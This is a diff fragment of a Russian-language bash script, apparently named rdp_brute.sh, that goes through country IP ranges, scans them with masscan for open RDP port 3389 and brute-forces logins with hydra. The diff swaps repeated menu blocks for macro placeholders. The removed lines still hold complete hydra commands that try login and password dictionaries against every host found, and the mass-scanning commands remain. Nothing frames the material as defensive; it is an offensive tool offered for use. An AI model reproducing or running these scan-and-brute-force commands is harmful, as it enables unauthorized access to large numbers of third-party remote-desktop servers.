@@ -13013,6 +5211,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13022,53 +5221,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "175" ]; then
@@ -13085,6 +5238,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13094,53 +5248,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -13158,6 +5266,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13167,53 +5276,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -13231,6 +5294,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13240,53 +5304,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "178" ]; then
@@ -13303,6 +5321,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13312,53 +5331,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "179" ]; then
@@ -13375,6 +5348,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13384,53 +5358,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "180" ]; then
@@ -13447,6 +5375,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13456,53 +5385,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -13520,6 +5403,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13529,53 +5413,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "182" ]; then
@@ -13592,6 +5430,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13601,53 +5440,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -13665,6 +5458,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13674,53 +5468,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -13738,6 +5486,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13747,53 +5496,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "185" ]; then
@@ -13810,6 +5513,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13819,53 +5523,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -13883,6 +5541,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13892,53 +5551,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -13956,6 +5569,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -13965,53 +5579,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
